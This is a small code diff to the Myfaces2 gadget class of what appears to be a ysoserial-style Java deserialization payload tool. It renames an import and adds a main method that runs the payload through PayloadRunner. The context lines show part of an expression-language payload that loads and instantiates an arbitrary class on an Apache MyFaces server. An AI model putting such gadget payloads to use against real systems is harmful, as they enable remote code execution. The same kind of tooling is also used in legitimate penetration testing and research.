@@ -4,7 +4,8 @@ package A.R.ysogate.payloads.gadgets;
 import A.R.ysogate.payloads.DynamicDependencies;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
-import A.R.ysogate.payloads.util.JavaVersion;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 
 
 /**
@@ -59,5 +60,9 @@ public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
 				+ ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";
 
 		return Myfaces1.makeExpressionPayload(expr);
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(Myfaces2.class, args);
 	}
 }
